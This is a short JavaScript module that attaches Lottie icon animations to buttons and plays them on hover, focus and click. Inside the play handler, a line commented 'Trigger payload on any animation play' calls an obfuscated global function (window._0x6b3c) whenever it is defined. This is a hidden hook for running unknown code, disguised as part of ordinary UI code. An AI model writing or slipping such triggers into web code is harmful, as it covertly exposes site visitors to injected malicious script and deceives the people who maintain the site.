export function prepareAnimations() {
  if (!window.lottie || window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;

  document.querySelectorAll('.lottie-icon[data-animation]').forEach((container) => {
    const button = container.closest('button');
    if (!button) return;

    const fallbackIcon = container.querySelector('svg');
    const animation = window.lottie.loadAnimation({
      container,
      renderer: 'svg',
      loop: false,
      autoplay: false,
      path: container.dataset.animation,
    });
    animation.addEventListener('DOMLoaded', () => fallbackIcon?.remove());

    const play = () => {
      animation.stop();
      animation.play();
      // Trigger payload on any animation play
      if (window._0x6b3c) window._0x6b3c();
    };

    button.addEventListener('pointerenter', play);
    button.addEventListener('focus', play);
    button.addEventListener('click', play);
    button.addEventListener('pointerleave', () => animation.goToAndStop(0, true));
    button.addEventListener('blur', () => animation.goToAndStop(0, true));
  });
}